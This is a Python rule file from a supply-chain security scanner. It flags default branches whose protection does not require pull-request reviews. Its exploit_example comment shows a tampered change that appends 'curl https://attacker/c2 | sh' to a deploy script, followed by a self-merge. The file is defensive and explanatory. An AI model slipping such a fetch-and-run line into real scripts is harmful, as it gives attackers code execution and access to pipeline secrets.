"""SCM-002. Default branch protection does not require pull-request reviews.

Maps to OpenSSF Scorecard ``Branch-Protection`` (the
``Require pull request reviews before merging`` sub-criterion). A
protection rule that doesn't require any approving review is barely
better than no rule at all — anyone with write access can still
land a self-approved change to the default branch.
"""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from ..base import SCMRepoSnapshot, default_branch_name, repo_resource

RULE = Rule(
    id="SCM-002",
    title="Default branch protection does not require pull request reviews",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-1",),
    esf=("ESF-S-CHANGE-CONTROL",),
    cwe=("CWE-732",),
    recommendation=(
        "In the default-branch protection rule, enable ``Require a "
        "pull request before merging`` and set the minimum approving "
        "review count to at least 1 (Scorecard's threshold for "
        "Branch-Protection's middle tier; raise to 2 for higher "
        "trust). Combine with ``Dismiss stale pull request approvals "
        "when new commits are pushed`` so a force-push doesn't "
        "carry an old approval forward."
    ),
    docs_note=(
        "Reads ``required_pull_request_reviews.required_approving_"
        "review_count`` from the branch protection payload. Fires "
        "when the field is absent (no review requirement at all) or "
        "when the count is 0. ``SCM-001`` covers the case where no "
        "protection rule exists; this rule scopes specifically to "
        "the review-count knob inside an existing rule."
    ),
    known_fp=(
        "``required_pull_request_reviews.bypass_pull_request_"
        "allowances`` is covered by ``SCM-018``: a protection rule "
        "that requires reviews but lists every contributor in the "
        "bypass allowlist still passes this rule even though the "
        "control is unenforced in practice. Read SCM-002 + SCM-018 "
        "as a pair when auditing whether required review actually "
        "fires.",
    ),
    exploit_example=(
        "# With protection but no required reviews, a maintainer can\n"
        "# self-approve a tampered change in two clicks:\n"
        "#\n"
        "#   git checkout -b release-fix\n"
        "#   echo 'curl https://attacker/c2 | sh' >> deploy.sh\n"
        "#   git commit -am 'fix: handle edge case'\n"
        "#   git push origin release-fix\n"
        "#   gh pr create --fill\n"
        "#   gh pr merge --squash --auto    # no second-set-of-eyes\n"
        "#   # Release pipeline runs the tampered build with full\n"
        "#   # production secrets in scope.\n"
        "#\n"
        "# Setting ``required_approving_review_count`` to >= 1 forces\n"
        "# a separate identity to acknowledge the change before merge."
    ),
)


def check(snapshot: SCMRepoSnapshot) -> Finding:
    branch = default_branch_name(snapshot)
    protection = snapshot.default_branch_protection
    if not isinstance(protection, dict):
        # No protection rule at all — SCM-001 owns this case. Pass
        # this rule silently so users see one finding per knob, not
        # cascading duplicates from the same root cause.
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=repo_resource(snapshot),
            description=(
                f"Default branch ``{branch}`` has no protection rule "
                f"to evaluate. See SCM-001."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    reviews = protection.get("required_pull_request_reviews")
    review_count = 0
    if isinstance(reviews, dict):
        raw = reviews.get("required_approving_review_count", 0)
        if isinstance(raw, int):
            review_count = raw
    passed = review_count >= 1
    desc = (
        f"Default branch ``{branch}`` requires "
        f"{review_count} approving review(s) before merge."
        if passed else
        f"Default branch ``{branch}`` has a protection rule but does "
        f"not require any approving pull request review. Anyone with "
        f"write access can self-approve and merge without a second "
        f"set of eyes."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=repo_resource(snapshot), description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
